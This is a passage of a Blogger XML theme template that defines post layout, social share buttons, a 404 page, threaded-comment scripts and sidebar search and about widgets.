      <a class='blog-pager-older-link' expr:href='data:olderPageUrl' expr:id='data:widget.instanceId + &quot;_blog-pager-older-link&quot;' expr:title='data:olderPageTitle'><data:olderPageTitle/></a>
      </span>
    </b:if>

    <a class='home-link' expr:href='data:blog.homepageUrl'><data:homeMsg/></a>

    <b:if cond='data:mobileLinkUrl'>
      <div class='blog-mobile-link'>
        <a expr:href='data:mobileLinkUrl'><data:mobileLinkMsg/></a>
      </div>
    </b:if>

  </div>
  <div class='clear'/>
</b:includable>
       <b:includable id='post' var='post'>
  <div class='post hentry'> 

     <b:if cond='data:blog.pageType == &quot;index&quot;'>
             <b:if cond='data:post.firstImageUrl'>
               <div class='post-home-image'>
<span class='post-labels'>
        <b:if cond='data:post.labels'>
         <i class='fa fa-folder-open-o'/>
         <b:loop values='data:post.labels' var='label'>
                                  <b:if cond='data:label.isLast == &quot;true&quot;'>
                                    <a expr:href='data:label.url + &quot;?&amp;max-results=7&quot;' rel='tag'><data:label.name/></a>
                                  </b:if>
                                </b:loop>
        </b:if>
       </span>
<a expr:href='data:post.url'>
<img class='post-thumb' expr:src='data:post.thumbnailUrl.isYouTube ? resizeImage(data:post.thumbnailUrl.youtubeMaxResDefaultUrl.jsonEscaped, 72, &quot;1:1&quot;) : resizeImage(data:post.thumbnailUrl, 72, &quot;1:1&quot;)'/>
</a>
                 </div>
               <b:else/>
               <b:if cond='data:post.thumbnailUrl'>
                 <div class='post-home-image'>
<span class='post-labels'>
        <b:if cond='data:post.labels'>
         <i class='fa fa-folder-open-o'/>
         <b:loop values='data:post.labels' var='label'>
                                  <b:if cond='data:label.isLast == &quot;true&quot;'>
                                    <a expr:href='data:label.url + &quot;?&amp;max-results=7&quot;' rel='tag'><data:label.name/></a>
                                  </b:if>
                                </b:loop>
        </b:if>
       </span>
                  <a expr:href='data:post.url'>
<img class='post-thumb' expr:src='data:post.thumbnailUrl.isYouTube ? resizeImage(data:post.thumbnailUrl.youtubeMaxResDefaultUrl.jsonEscaped, 72, &quot;1:1&quot;) : resizeImage(data:post.thumbnailUrl, 72, &quot;1:1&quot;)'/>
</a>
                   </div>
                 <b:else/>
                 <div class='post-home-image'>
<span class='post-labels'>
        <b:if cond='data:post.labels'>
         <i class='fa fa-folder-open-o'/>
         <b:loop values='data:post.labels' var='label'>
                                  <b:if cond='data:label.isLast == &quot;true&quot;'>
                                    <a expr:href='data:label.url + &quot;?&amp;max-results=7&quot;' rel='tag'><data:label.name/></a>
                                  </b:if>
                                </b:loop>
        </b:if>
       </span>
                   <a expr:href='data:post.url'>
<img class='post-thumb' expr:src='data:post.thumbnailUrl.isYouTube ? resizeImage(data:post.thumbnailUrl.youtubeMaxResDefaultUrl.jsonEscaped, 72, &quot;1:1&quot;) : resizeImage(data:post.thumbnailUrl, 72, &quot;1:1&quot;)'/>
</a>
                   </div>
               </b:if></b:if>
           </b:if>
           <b:if cond='data:blog.pageType == &quot;archive&quot;'>
             <b:if cond='data:post.firstImageUrl'>
               <div class='post-home-image'>
<span class='post-labels'>
        <b:if cond='data:post.labels'>
         <i class='fa fa-folder-open-o'/>
         <b:loop values='data:post.labels' var='label'>
                                  <b:if cond='data:label.isLast == &quot;true&quot;'>
                                    <a expr:href='data:label.url + &quot;?&amp;max-results=7&quot;' rel='tag'><data:label.name/></a>
                                  </b:if>
                                </b:loop>
        </b:if>
       </span>
<a class='post-thumb' expr:href='data:post.url'>
                 <img expr:alt='data:post.title' expr:src='data:post.firstImageUrl'/>
                 </a>
                 </div>
               <b:else/>
               <b:if cond='data:post.thumbnailUrl'>
                 <div class='post-home-image'>
<span class='post-labels'>
        <b:if cond='data:post.labels'>
         <i class='fa fa-folder-open-o'/>
         <b:loop values='data:post.labels' var='label'>
                                  <b:if cond='data:label.isLast == &quot;true&quot;'>
                                    <a expr:href='data:label.url + &quot;?&amp;max-results=7&quot;' rel='tag'><data:label.name/></a>
                                  </b:if>
                                </b:loop>
        </b:if>
       </span>
                   <a class='post-thumb' expr:href='data:post.url'>
                 <img expr:alt='data:post.title' expr:src='data:post.thumbnailUrl'/>
                 </a>
                   </div>
                 <b:else/>
                 <div class='post-home-image'>
<span class='post-labels'>
        <b:if cond='data:post.labels'>
         <i class='fa fa-folder-open-o'/>
         <b:loop values='data:post.labels' var='label'>
                                  <b:if cond='data:label.isLast == &quot;true&quot;'>
                                    <a expr:href='data:label.url + &quot;?&amp;max-results=7&quot;' rel='tag'><data:label.name/></a>
                                  </b:if>
                                </b:loop>
        </b:if>
       </span>
                   <a class='post-thumb' expr:href='data:post.url'>
                 <img expr:alt='data:post.title' src='http://3.bp.blogspot.com/-Yw8BIuvwoSQ/VsjkCIMoltI/AAAAAAAAC4c/s55PW6xEKn0/s1600-r/nth.png'/>
                 </a>
                   </div>
               </b:if></b:if>
           </b:if>
          
     <b:if cond='data:blog.pageType == &quot;item&quot;'>
    &lt;div itemprop=&#39;blogPost&#39; itemscope=&#39;itemscope&#39; itemtype=&#39;http://schema.org/BlogPosting&#39;&gt;
      <meta expr:content='data:post.firstImageUrl' itemprop='image'/>
    </b:if>
<div id='new-badge' style='display:none;'>New</div>
    <div class='post-header'>
 <b:if cond='data:blog.pageType == &quot;item&quot;'>
        <b:if cond='data:post.title'>
      <div class='post-head'><h1 class='post-title entry-title' itemprop='name headline'>
      <b:if cond='data:post.link'>
        <a expr:href='data:post.link'><data:post.title/></a>
      <b:else/>
        <b:if cond='data:post.url'>
          <b:if cond='data:blog.url != data:post.url'>
            <a expr:href='data:post.url'><data:post.title/></a>
          <b:else/>
            <data:post.title/>
          </b:if>
        <b:else/>
          <data:post.title/>
        </b:if>
      </b:if>
        </h1></div>
    </b:if>
        <div class='post-meta'>
<span class='post-author vcard'>
        <b:if cond='data:top.showAuthor'>
          <i class='fa fa-user'/>
            <b:if cond='data:post.authorProfileUrl'>
              <span class='fn' itemprop='author' itemscope='itemscope' itemtype='http://schema.org/Person'>
                <meta expr:content='data:post.authorProfileUrl' itemprop='url'/>
                <a class='g-profile' expr:href='data:post.authorProfileUrl' expr:title='data:post.author' rel='author'>
                  <span itemprop='name'><data:post.author/></span>
                </a>
              </span>
            <b:else/>
              <span class='fn' itemprop='author' itemscope='itemscope' itemtype='http://schema.org/Person'>
                <a class='g-profile' expr:href='data:post.authorProfileUrl' expr:title='data:post.author' rel='author'>
                  <span itemprop='name'><data:post.author/></span></a>
              </span>
            </b:if>
        </b:if>
      </span>
 <span class='post-timestamp'>
        <b:if cond='data:top.showTimestamp'>
          <i class='fa fa-calendar-o'/>
        <b:if cond='data:post.url'>
          <meta expr:content='data:post.canonicalUrl' itemprop='url'/>
          <a class='timestamp-link' expr:href='data:post.url' rel='bookmark' title='permanent link'><abbr class='published timeago' expr:title='data:post.timestampISO8601' itemprop='datePublished'><data:post.timestamp/></abbr></a>
        </b:if>
        </b:if>
      </span>
<span class='label-head'>
        <b:if cond='data:post.labels'>
         <i class='fa fa-folder-open-o'/>
          <b:loop values='data:post.labels' var='label'>
            <a expr:href='data:label.url + &quot;?&amp;max-results=7&quot;' rel='tag'><data:label.name/></a><b:if cond='data:label.isLast != &quot;true&quot;'>,</b:if>
          </b:loop>
        </b:if>
      </span>
        </div>
   </b:if>
  <b:if cond='data:blog.pageType == &quot;static_page&quot;'>
    <b:if cond='data:post.title'>
      <div class='post-head'><h1 class='post-title entry-title' itemprop='name'>
      <b:if cond='data:post.link'>
        <a expr:href='data:post.link'><data:post.title/></a>
      <b:else/>
        <b:if cond='data:post.url'>
          <b:if cond='data:blog.url != data:post.url'>
            <a expr:href='data:post.url'><data:post.title/></a>
          <b:else/>
            <data:post.title/>
          </b:if>
        <b:else/>
          <data:post.title/>
        </b:if>
      </b:if>
        </h1></div>
    </b:if>
    </b:if>
   
    </div>

    <!-- Then use the post body as the schema.org description, for good G+/FB snippeting. -->
    <article>
         <b:if cond='data:blog.pageType != &quot;item&quot;'>
         <b:if cond='data:blog.pageType != &quot;static_page&quot;'>
          <b:if cond='data:post.title'>
              <font class='retitle'>
                <h2 class='post-title entry-title'>
                   <b:if cond='data:post.link'>
                    <a expr:href='data:post.link'>
                       <data:post.title/>
                      </a>
                      <b:else/>
                      <b:if cond='data:post.url'>
                       <a expr:href='data:post.url'>
                       <data:post.title/>
                      </a>
                      <b:else/>
                     <data:post.title/>
                     </b:if>
                   </b:if>
                  </h2>
                    </font>
                </b:if>
                  <div class='date-header'>
                     <div id='meta-post'>
                       <i class='fa fa-user'/> 
<a class='g-profile' expr:href='data:post.authorProfileUrl' expr:title='data:post.author' rel='author'>
                  <span itemprop='name'><data:post.author/></span></a> 
<i class='fa fa-calendar-o'/>
<abbr class='published timeago' expr:title='data:post.timestampISO8601'><data:post.timestamp/></abbr>
 <span class='post-comment-link'>
   <i class='fa fa-comments-o'/>
                          <b:if cond='data:post.allowComments'>
            <a class='comment-bubble' expr:href='data:post.addCommentUrl' expr:onclick='data:post.addCommentOnclick'>
               <data:post.numComments/> Comments
            </a>
        </b:if>
  </span>
</div>
<div class='resumo'><span><data:post.snippet/></span></div>
                      <div style='clear: both;'/>
<a class='read-more anchor-hover' expr:href='data:post.url'>Read More</a>
                      </div>
            <b:else/>
       <div class='post-body entry-content' expr:id='&quot;post-body-&quot; + data:post.id' itemprop='articleBody'>
         <meta expr:content='data:post.snippet' name='twitter:description'/>
         <data:post.body/>
       </div>
          </b:if>
          <b:else/>
       <div class='post-body entry-content' expr:id='&quot;post-body-&quot; + data:post.id' itemprop='articleBody'>
         <meta expr:content='data:post.snippet' name='twitter:description'/>
         <data:post.body/>
       </div>
         </b:if>
<div class='second-meta'>
  <a class='read-more anchor-hover' expr:href='data:post.url'>Read more <i class='fa fa-chevron-right'/></a>
                          <span class='post-comment-link'>
                            <i class='fa fa-comment'/>
                            <b:include cond='data:blog.pageType not in {&quot;item&quot;,&quot;static_page&quot;} and data:post.allowComments' data='post' name='comment_count_picker'/>
                          </span>
      </div>
     </article>

    <b:if cond='data:post.hasJumpLink'>
      <div class='jump-link'>
        <a expr:href='data:post.url + &quot;#more&quot;' expr:title='data:post.title'><data:post.jumpText/></a>
      </div>
    </b:if>

    <div class='post-footer'>
<b:if cond='data:blog.pageType == &quot;item&quot;'>

                 
      <div style='clear:both'/> 
<div id='subscribe-box'>

<div class='share-box'>
 
          <h8 class='share-title'>Share This:</h8>
               <div class='share-art'> 
<a class='fac-art' expr:href='&quot;http://www.facebook.com/sharer.php?u=&quot; + data:post.url + &quot;&amp;title=&quot;+ data:post.title' onclick='window.open(this.href, &apos;windowName&apos;, &apos;width=600, height=400, left=24, top=24, scrollbars, resizable&apos;); return false;' rel='nofollow' target='_blank'><i class='fa fa-facebook'/><span class='resp_del'> Facebook</span></a>

<a class='twi-art' expr:href='&quot;http://twitter.com/share?url=&quot; + data:post.url + &quot;&amp;title=&quot; + data:post.title' onclick='window.open(this.href, &apos;windowName&apos;, &apos;width=600, height=400, left=24, top=24, scrollbars, resizable&apos;); return false;' rel='nofollow' target='_blank'><i class='fa fa-twitter'/><span class='resp_del2'> Twitter</span></a>

<a class='pin-art' expr:href='&quot;http://pinterest.com/pin/create/button/?url=&quot; + data:post.url + &quot;&amp;media=&quot; + data:post.firstImageUrl + &quot;&amp;description=&quot; + data:post.snippet' onclick='window.open(this.href, &apos;windowName&apos;, &apos;width=600, height=400, left=24, top=24, scrollbars, resizable&apos;); return false;' rel='nofollow' target='_blank'><i class='fa fa-pinterest'/><span class='resp_del4'> Pinterest</span></a>  

<a class='lin-art' expr:href='&quot;http://www.linkedin.com/shareArticle?url=&quot; + data:post.url + &quot;&amp;title=&quot;+ data:post.title' onclick='window.open(this.href, &apos;windowName&apos;, &apos;width=600, height=400, left=24, top=24, scrollbars, resizable&apos;); return false;' rel='nofollow' target='_blank'><i class='fa fa-linkedin-square'/><span class='resp_del5'> Linkedin</span></a>

<whatsapp expr:href='data:post.url' expr:text='data:post.title'/>
<a class='wat-art' expr:href='&quot;whatsapp://send?text=&quot; + data:post.title + &quot; &gt;&gt; &quot; + data:post.url' rel='nofollow' target='_blank'><i class='fa fa-whatsapp'/><span class='resp_del5'> Whatsapp</span></a>

</div>
         </div>
</div>
<div style='clear:both;'/>   
<div class='post-pager' id='post-pager'>
    <b:if cond='data:newerPageUrl'>
      <span id='blog-pager-newer-link'>
      <a class='blog-pager-newer-link' expr:href='data:newerPageUrl' expr:id='data:widget.instanceId + &quot;_blog-pager-newer-link&quot;' expr:title='data:newerPageTitle'/>
      </span>
    </b:if>

    <b:if cond='data:olderPageUrl'>
      <span id='blog-pager-older-link'>
      <a class='blog-pager-older-link' expr:href='data:olderPageUrl' expr:id='data:widget.instanceId + &quot;_blog-pager-older-link&quot;' expr:title='data:olderPageTitle'/>
      </span>
    </b:if>

  </div>              
     
             
  
      <div style='clear:both'/> 
  
<div id='related-posts'>
        <b:if cond='data:post.labels'>
          <b:loop values='data:post.labels' var='label'>
            <b:if cond='data:label.isLast == &quot;true&quot;'>
              <data:label.name/>
            </b:if>
          </b:loop>
        </b:if>
      </div>
   </b:if>
    <div class='post-footer-line post-footer-line-1'>
      <span class='post-author vcard'>
        <b:if cond='data:top.showAuthor'>
          <data:top.authorLabel/>
            <b:if cond='data:post.authorProfileUrl'>
              <span class='fn' itemprop='author' itemscope='itemscope' itemtype='http://schema.org/Person'>
                <meta expr:content='data:post.authorProfileUrl' itemprop='url'/>
                <a class='g-profile' expr:href='data:post.authorProfileUrl' rel='author' title='author profile'>
                  <span itemprop='name'><data:post.author/></span>
                </a>
              </span>
            <b:else/>
              <span class='fn' itemprop='author' itemscope='itemscope' itemtype='http://schema.org/Person'>
                <span itemprop='name'><data:post.author/></span>
              </span>
            </b:if>
        </b:if>
      </span>

      <span class='post-timestamp'>
        <b:if cond='data:top.showTimestamp'>
          <data:top.timestampLabel/>
          <b:if cond='data:post.url'>
            <meta expr:content='data:post.canonicalUrl' itemprop='url'/>
            <a class='timestamp-link' expr:href='data:post.url' rel='bookmark' title='permanent link'><abbr class='published' expr:title='data:post.timestampISO8601' itemprop='datePublished'><data:post.timestamp/></abbr></a>
          </b:if>
        </b:if>
      </span>

      <span class='reaction-buttons'>
        <b:if cond='data:top.showReactions'>
          <table border='0' cellpadding='0' cellspacing='0' width='100%'><tr>
            <td class='reactions-label-cell' nowrap='nowrap' valign='top' width='1%'>
              <span class='reactions-label'>
              <data:top.reactionsLabel/></span>&#160;</td>
            <td><iframe allowtransparency='true' class='reactions-iframe' expr:src='data:post.reactionsUrl' frameborder='0' name='reactions' scrolling='no'/></td>
           </tr></table>
        </b:if>
      </span>

      <span class='post-comment-link'>
        <b:include cond='data:blog.pageType not in {&quot;item&quot;,&quot;static_page&quot;}                          and data:post.allowComments' data='post' name='comment_count_picker'/>
      </span>

       <!-- backlinks -->
       <span class='post-backlinks post-comment-link'>
         <b:if cond='data:blog.pageType not in {&quot;item&quot;,&quot;static_page&quot;}                      and data:post.showBacklinks'>
           <a class='comment-link' expr:href='data:post.url + &quot;#links&quot;'><data:top.backlinkLabel/></a>
         </b:if>
       </span>

      <span class='post-icons'>
        <!-- email post links -->
        <b:if cond='data:post.emailPostUrl'>
          <span class='item-action'>
          <a expr:href='data:post.emailPostUrl' expr:title='data:top.emailPostMsg'>
            <img alt='' class='icon-action' height='13' src='//img1.blogblog.com/img/icon18_email.gif' width='18'/>
          </a>
          </span>
        </b:if>

        <!-- quickedit pencil -->
        <b:include data='post' name='postQuickEdit'/>
      </span>

      <!-- share buttons -->
      <div class='post-share-buttons goog-inline-block'>
        <b:include cond='data:post.sharePostUrl' data='post' name='shareButtons'/>
      </div>

      </div>

      <div class='post-footer-line post-footer-line-2'>
      <span class='post-labels'>
        <b:if cond='data:post.labels'>
          <data:postLabelsLabel/>
          <b:loop values='data:post.labels' var='label'>
            <a expr:href='data:label.url + &quot;?&amp;max-results=7&quot;' rel='tag'><data:label.name/></a><b:if cond='not data:label.isLast'>,</b:if>
          </b:loop>
        </b:if>
      </span>
      </div>

      <div class='post-footer-line post-footer-line-3'>
      <span class='post-location'>
        <b:if cond='data:top.showLocation'>
          <b:if cond='data:post.location'>
            <data:postLocationLabel/>
            <a expr:href='data:post.location.mapsUrl' target='_blank'><data:post.location.name/></a>
          </b:if>
        </b:if>
      </span>
      </div>
      <b:if cond='data:post.authorAboutMe'>
        <div class='author-profile' itemprop='author' itemscope='itemscope' itemtype='http://schema.org/Person'>
          <b:if cond='data:post.authorPhoto.url'>
            <img expr:src='data:post.authorPhoto.url' itemprop='image' width='50px'/>
          </b:if>
          <div>
            <a class='g-profile' expr:href='data:post.authorProfileUrl' itemprop='url' rel='author' title='author profile'>
              <span itemprop='name'><data:post.author/></span>
            </a>
          </div>
          <span itemprop='description'><data:post.authorAboutMe/></span>
        </div>
      </b:if>
    </div>
   <b:if cond='data:blog.pageType == &quot;item&quot;'>
      &lt;/div&gt;
    </b:if>
  </div>
</b:includable>
       <b:includable id='postQuickEdit' var='post'>
  <b:if cond='data:post.editUrl'>
    <span expr:class='&quot;item-control &quot; + data:post.adminClass'>
      <a expr:href='data:post.editUrl' expr:title='data:top.editPostMsg'>
        <img alt='' class='icon-action' height='18' src='https://resources.blogblog.com/img/icon18_edit_allbkg.gif' width='18'/>
      </a>
    </span>
  </b:if>
</b:includable>
       <b:includable id='shareButtons' var='post'>
  <b:if cond='data:top.showEmailButton'><a class='goog-inline-block share-button sb-email' expr:href='data:post.sharePostUrl + &quot;&amp;target=email&quot;' expr:title='data:top.emailThisMsg' target='_blank'><span class='share-button-link-text'><data:top.emailThisMsg/></span></a></b:if><b:if cond='data:top.showBlogThisButton'><a class='goog-inline-block share-button sb-blog' expr:href='data:post.sharePostUrl + &quot;&amp;target=blog&quot;' expr:onclick='&quot;window.open(this.href, \&quot;_blank\&quot;, \&quot;height=270,width=475\&quot;); return false;&quot;' expr:title='data:top.blogThisMsg' target='_blank'><span class='share-button-link-text'><data:top.blogThisMsg/></span></a></b:if><b:if cond='data:top.showTwitterButton'><a class='goog-inline-block share-button sb-twitter' expr:href='data:post.sharePostUrl + &quot;&amp;target=twitter&quot;' expr:title='data:top.shareToTwitterMsg' target='_blank'><span class='share-button-link-text'><data:top.shareToTwitterMsg/></span></a></b:if><b:if cond='data:top.showFacebookButton'><a class='goog-inline-block share-button sb-facebook' expr:href='data:post.sharePostUrl + &quot;&amp;target=facebook&quot;' expr:onclick='&quot;window.open(this.href, \&quot;_blank\&quot;, \&quot;height=430,width=640\&quot;); return false;&quot;' expr:title='data:top.shareToFacebookMsg' target='_blank'><span class='share-button-link-text'><data:top.shareToFacebookMsg/></span></a></b:if><b:if cond='data:top.showPinterestButton'><a class='goog-inline-block share-button sb-pinterest' expr:href='data:post.sharePostUrl + &quot;&amp;target=pinterest&quot;' expr:title='data:top.shareToPinterestMsg' target='_blank'><span class='share-button-link-text'><data:top.shareToPinterestMsg/></span></a></b:if><b:if cond='data:top.showPlusOne'><div class='goog-inline-block google-plus-share-container'><data:post.googlePlusShareTag/></div></b:if>
</b:includable>
       <b:includable id='status-message'>
  <b:if cond='data:navMessage'>
  <div class='status-msg-wrap'>
    <div class='status-msg-body'>
      <data:navMessage/>
    </div>
    <div class='status-msg-border'>
      <div class='status-msg-bg'>
        <div class='status-msg-hidden'><data:navMessage/></div>
      </div>
    </div>
  </div>
  <div style='clear: both;'/>
<b:if cond='data:blog.pageType == &quot;error_page&quot;'>
  <div class='post-404'>
<div class='actions-404'>
<div class='ops-404'><span>Oops;</span> Sorry, but the page you were trying to view does not exist.
                        </div>
<div class='title-404'>404</div>
<div class='link-404'>
<a href='/'><i class='fa fa-car'/>
<trans>Back to Home</trans></a>
</div></div>
</div>
<style>
.post-404 {
    padding-top: 40px;
    padding-bottom: 60px;
}
.actions-404 {
    width: 100%;
    float: right;
    text-align: center;
}
.ops-404 {
    width: 50%;
    margin: 0 auto;
    font-size: 26px;
    font-weight: 400;
letter-spacing:1.5px;
}
.ops-404 span {
    font-weight: 700;
}
.title-404 {
    font-size: 200px;
    font-weight: 700;
    line-height: 1.1;
    color:#f61010;
}
.link-404 {
    font-size: 18px;
    padding-top: 20px;
    padding-bottom: 50px;
}
#blog-pager, #sidebar-wrapper,.status-msg-wrap {
    display: none;
}
.status-msg-border {
         border: 0 !important;
       }
       .status-msg-bg {
         background-color: #fff;
       }
#main-wrapper {
    float: none;
    width: 100%;
    max-width: 100%;
}
</style>
      </b:if>
  </b:if>
</b:includable>
       <b:includable id='threaded-comment-form' var='post'>
  <div class='comment-form'>
    <a name='comment-form'/>
    <b:if cond='data:mobile'>
      <p><data:blogCommentMessage/></p>
      <data:blogTeamBlogMessage/>
      <a expr:href='data:post.commentFormIframeSrc' id='comment-editor-src'/>
      <iframe allowtransparency='true' class='blogger-iframe-colorize blogger-comment-from-post' expr:height='data:cmtIframeInitialHeight' frameborder='0' id='comment-editor' name='comment-editor' src='' style='display: none' width='100%'/>
    <b:else/>
      <p><data:blogCommentMessage/></p>
      <data:blogTeamBlogMessage/>
      <a expr:href='data:post.commentFormIframeSrc' id='comment-editor-src'/>
      <iframe allowtransparency='true' class='blogger-iframe-colorize blogger-comment-from-post' expr:height='data:cmtIframeInitialHeight' frameborder='0' id='comment-editor' name='comment-editor' src='' width='100%'/>
    </b:if>
    <data:post.cmtfpIframe/>
    <script type='text/javascript'>
      BLOG_CMT_createIframe(&#39;<data:post.appRpcRelayPath/>&#39;);
    </script>
  </div>
</b:includable>
       <b:includable id='threaded_comment_js' var='post'>
  <script async='async' expr:src='data:post.commentSrc' type='text/javascript'/>

  <script type='text/javascript'>
    (function() {
      var items = <data:post.commentJso/>;
      var msgs = <data:post.commentMsgs/>;
      var config = <data:post.commentConfig/>;

// <![CDATA[
      var cursor = null;
      if (items && items.length > 0) {
        cursor = parseInt(items[items.length - 1].timestamp) + 1;
      }

      var bodyFromEntry = function(entry) {
        if (entry.gd$extendedProperty) {
          for (var k in entry.gd$extendedProperty) {
            if (entry.gd$extendedProperty[k].name == 'blogger.contentRemoved') {
              return '<span class="deleted-comment">' + entry.content.$t + '</span>';
            }
          }
        }
        return entry.content.$t;
      }

      var parse = function(data) {
        cursor = null;
        var comments = [];
        if (data && data.feed && data.feed.entry) {
          for (var i = 0, entry; entry = data.feed.entry[i]; i++) {
            var comment = {};
            // comment ID, parsed out of the original id format
            var id = /blog-(\d+).post-(\d+)/.exec(entry.id.$t);
            comment.id = id ? id[2] : null;
            comment.body = bodyFromEntry(entry);
            comment.timestamp = Date.parse(entry.published.$t) + '';
            if (entry.author && entry.author.constructor === Array) {
              var auth = entry.author[0];
              if (auth) {
                comment.author = {
                  name: (auth.name ? auth.name.$t : undefined),
                  profileUrl: (auth.uri ? auth.uri.$t : undefined),
                  avatarUrl: (auth.gd$image ? auth.gd$image.src : undefined)
                };
              }
            }
            if (entry.link) {
              if (entry.link[2]) {
                comment.link = comment.permalink = entry.link[2].href;
              }
              if (entry.link[3]) {
                var pid = /.*comments\/default\/(\d+)\?.*/.exec(entry.link[3].href);
                if (pid && pid[1]) {
                  comment.parentId = pid[1];
                }
              }
            }
            comment.deleteclass = 'item-control blog-admin';
            if (entry.gd$extendedProperty) {
              for (var k in entry.gd$extendedProperty) {
                if (entry.gd$extendedProperty[k].name == 'blogger.itemClass') {
                  comment.deleteclass += ' ' + entry.gd$extendedProperty[k].value;
                } else if (entry.gd$extendedProperty[k].name == 'blogger.displayTime') {
                  comment.displayTime = entry.gd$extendedProperty[k].value;
                }
              }
            }
            comments.push(comment);
          }
        }
        return comments;
      };

      var paginator = function(callback) {
        if (hasMore()) {
          var url = config.feed + '?alt=json&v=2&orderby=published&reverse=false&max-results=50';
          if (cursor) {
            url += '&published-min=' + new Date(cursor).toISOString();
          }
          window.bloggercomments = function(data) {
            var parsed = parse(data);
            cursor = parsed.length < 50 ? null
                : parseInt(parsed[parsed.length - 1].timestamp) + 1
            callback(parsed);
            window.bloggercomments = null;
          }
          url += '&callback=bloggercomments';
          var script = document.createElement('script');
          script.type = 'text/javascript';
          script.src = url;
          document.getElementsByTagName('head')[0].appendChild(script);
        }
      };
      var hasMore = function() {
        return !!cursor;
      };
      var getMeta = function(key, comment) {
        if ('iswriter' == key) {
          var matches = !!comment.author
              && comment.author.name == config.authorName
              && comment.author.profileUrl == config.authorUrl;
          return matches ? 'true' : '';
        } else if ('deletelink' == key) {
          return config.baseUri + '/delete-comment.g?blogID='
               + config.blogId + '&postID=' + comment.id;
        } else if ('deleteclass' == key) {
          return comment.deleteclass;
        }
        return '';
      };

      var replybox = null;
      var replyUrlParts = null;
      var replyParent = undefined;

      var onReply = function(commentId, domId) {
        if (replybox == null) {
          // lazily cache replybox, and adjust to suit this style:
          replybox = document.getElementById('comment-editor');
          if (replybox != null) {
            replybox.height = '250px';
            replybox.style.display = 'block';
            replyUrlParts = replybox.src.split('#');
          }
        }
        if (replybox && (commentId !== replyParent)) {
          replybox.src = '';
          document.getElementById(domId).insertBefore(replybox, null);
          replybox.src = replyUrlParts[0]
              + (commentId ? '&parentID=' + commentId : '')
              + '#' + replyUrlParts[1];
          replyParent = commentId;
        }
      };

      var hash = (window.location.hash || '#').substring(1);
      var startThread, targetComment;
      if (/^comment-form_/.test(hash)) {
        startThread = hash.substring('comment-form_'.length);
      } else if (/^c[0-9]+$/.test(hash)) {
        targetComment = hash.substring(1);
      }

      // Configure commenting API:
      var configJso = {
        'maxDepth': config.maxThreadDepth
      };
      var provider = {
        'id': config.postId,
        'data': items,
        'loadNext': paginator,
        'hasMore': hasMore,
        'getMeta': getMeta,
        'onReply': onReply,
        'rendered': true,
        'initComment': targetComment,
        'initReplyThread': startThread,
        'config': configJso,
        'messages': msgs
      };

      var render = function() {
        if (window.goog && window.goog.comments) {
          var holder = document.getElementById('comment-holder');
          window.goog.comments.render(holder, provider);
        }
      };

      // render now, or queue to render when library loads:
      if (window.goog && window.goog.comments) {
        render();
      } else {
        window.goog = window.goog || {};
        window.goog.comments = window.goog.comments || {};
        window.goog.comments.loadQueue = window.goog.comments.loadQueue || [];
        window.goog.comments.loadQueue.push(render);
      }
    })();
// ]]>
  </script>
</b:includable>
       <b:includable id='threaded_comments' var='post'>
  <div class='comments' id='comments'>
    <a name='comments'/>
    <h4><data:post.commentLabelFull/>:</h4>

    <div class='comments-content'>
      <b:include cond='data:post.embedCommentForm' data='post' name='threaded_comment_js'/>
      <div id='comment-holder'>
         <data:post.commentHtml/>
      </div>
    </div>

    <p class='comment-footer'>
      <b:if cond='data:post.allowNewComments'>
        <b:include data='post' name='threaded-comment-form'/>
      <b:else/>
        <data:post.noNewCommentsText/>
      </b:if>
    </p>

    <b:if cond='data:showCmtPopup'>
      <div id='comment-popup'>
        <iframe allowtransparency='true' frameborder='0' id='comment-actions' name='comment-actions' scrolling='no'>
        </iframe>
      </div>
    </b:if>

    <div id='backlinks-container'>
    <div expr:id='data:widget.instanceId + &quot;_backlinks-container&quot;'>
      <b:include cond='data:post.showBacklinks' data='post' name='backlinks'/>
    </div>
    </div>
  </div>
</b:includable>
     </b:widget>
   </b:section>    

</div>
  <div id='sidebar-wrapper'>
<b:section class='sidebar' id='sidebar' preferred='yes'>
  <b:widget id='HTML4' locked='false' title='Search' type='HTML' version='1'>
    <b:widget-settings>
      <b:widget-setting name='content'>&lt;style&gt;
#search-box {
position: relative;
width: 100%;
margin: 0;
}

#search-form 
{
height: 42px;
border: 1px solid #ebebeb;
background-color: #fff;
overflow: hidden;
}
#search-text 
{
font-size: 14px;
color: #ddd;
border-width: 0;
background: transparent;
height: 42px;
    line-height: 42px;
}

#search-box input[type=&quot;text&quot;]
{
width: 90%;
padding: 11px 0 12px 1em;
color: #333;
outline: none;
}

#search-button {
position: absolute;
top: 0;
right: 0;
height: 42px;
width: 80px;
font-size: 14px;
color: #fff;
text-align: center;
line-height: 42px;
border-width: 0;
background-color: #fb4834;

cursor: pointer;
}
&lt;/style&gt;

&lt;div id=&quot;search-box&quot;&gt;
&lt;form action=&quot;/search&quot; id=&quot;search-form&quot; method=&quot;get&quot; target=&quot;_top&quot;&gt;
&lt;input id=&quot;search-text&quot; name=&quot;q&quot; placeholder=&quot;Enter keyword...&quot; type=&quot;text&quot; /&gt;
&lt;button id=&quot;search-button&quot; type=&quot;submit&quot;&gt;&lt;span&gt;&lt;i class=&quot;fa fa-search&quot;&gt;&lt;/i&gt;&lt;/span&gt;&lt;/button&gt;
&lt;/form&gt;
&lt;/div&gt;</b:widget-setting>
    </b:widget-settings>
    <b:includable id='main'>
  <!-- only display title if it's non-empty -->
  <b:if cond='data:title != &quot;&quot;'>
    <h2 class='title'><data:title/></h2>
  </b:if>
  <div class='widget-content'>
    <data:content/>
  </div>

   <!--b:include name='quickedit'/-->
</b:includable>
  </b:widget>
  <b:widget id='HTML3' locked='false' title='About &amp;amp; Social' type='HTML' version='1'>
    <b:widget-settings>
      <b:widget-setting name='content'>&lt;div class=&#39;sidebar_about_author&#39;&gt;
&lt;div class=&#39;inner_wrapper&#39;&gt;
&lt;div class=&#39;sosmedarl-img&#39;&gt;
&lt;img alt=&#39;Judul Blog&#39; class=&#39;img-responsive&#39; height=&#39;auto&#39; src=&#39;//4.bp.blogspot.com/-7pWJpJ09ct0/VnpUJoqNvKI/AAAAAAAAANw/2KR6NOt6GnE/h200-w320-c/captain_jack_sparrow___vector.png&#39; title=&#39;Judul Blog&#39; width=&#39;300&#39;/&gt;

&lt;/div&gt;
&lt;/div&gt;
&lt;div class=&#39;sosmedarl-info&#39;&gt;
  &lt;h4&gt;&lt;span&gt;X-Mag&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;Our flagship theme is highly customizable through the options panel, so you can modify the design, layout and typography.&lt;/p&gt;
&lt;/div&gt;
